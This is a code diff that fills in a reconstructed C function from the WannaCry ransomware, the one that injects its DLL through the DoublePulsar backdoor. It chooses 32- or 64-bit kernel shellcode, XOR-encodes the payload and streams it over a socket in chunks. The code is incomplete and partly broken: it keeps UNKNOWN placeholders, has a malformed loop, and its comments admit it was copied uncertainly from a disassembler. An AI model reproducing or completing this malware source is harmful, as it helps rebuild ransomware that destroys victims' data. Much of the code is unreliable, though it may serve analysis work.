@@ -190,6 +190,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	32-bit shellcode start address 0x42E758, size is 0x1305 bytes
 	64-bit shellcode start address 0x42FA60, size 0x1800 bytes
 	*/
+	const void *rundll_shellcode;
 	int shellcode_payload_size;
 	int DLLSize;
 	if(architectureType)
@@ -205,29 +206,50 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		DLLSize = 0xc8a4;
 	}
 	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, shellcode_payload_size + DLLSize + 12);
-	memcpy(hMem + payload_size, UNKNOWN, UNKNOWN);
+	
+	//could be wrong but copied from IDA
+	//looks like the DLL
+	memcpy(hMem + shellcode_payload_size, h64_DLL, DLLSize);
 	if(architectureType)
 	{
-		//
+		//32 bits
+		rundll_shellcode = &x86_kernel_shellcode;
+		
 	}
 	else
 	{
-		//
+		//64 bits
+		rundll_shellcode = &x64_kernel_shellcode;
 	}
-	memcpy(hMem, UNKNOWN, UNKNOWN);
+	memcpy(hMem, rundll_shellcode, shellcode_payload_size);
 	xor_payload(xkey, hMem, UNKNOWN);
-	memcpy(send_buffer, UNKNOWN, 70);
+	memcpy(send_buffer, wannacry_trans2_exec_packet, 70);
 	
 	v9 = total_size / 4096;
 	v10 = total_size % 4096;
 	
+	/* may be needed for signature
+	#define __PAIR__(high, low) (((unsigned long)(high)<<sizeof(high)*8) | low)
+	
+	sources:
+	https://www.cnblogs.com/shangdawei/p/3537773.html
+	#define _DWORD uint32
+        #define _QWORD uint64
+	https://www.cnblogs.com/goodhacker/p/7692443.html
+	https://cloud.tencent.com/developer/article/1432392
+	https://github.com/nihilus/hexrays_tools/blob/master/code/defs.h
+	*/
+	
 	int ctx;
+	char signature[9];
 	if(total_size / 4096 > 0)
 	{
 		for(i=0; ctx=i)
 		{
 			//loop through the packets
-			xor_payload(xkey, UNKNOWN, 12);
+			//signature = __PAIR__(4096, UNK); //UNK = totalsize?
+			//*(DWORD *)&signature[8] = ctx;
+			xor_payload(xkey, signature, 12);
 			memcpy(send_buffer, (char *)hMem + ctx, 4096);
 			send(socket, (char*)send_buffer, 4178, 0);
 			recv(socket, (char*)recv_buffer, 4096, 0);
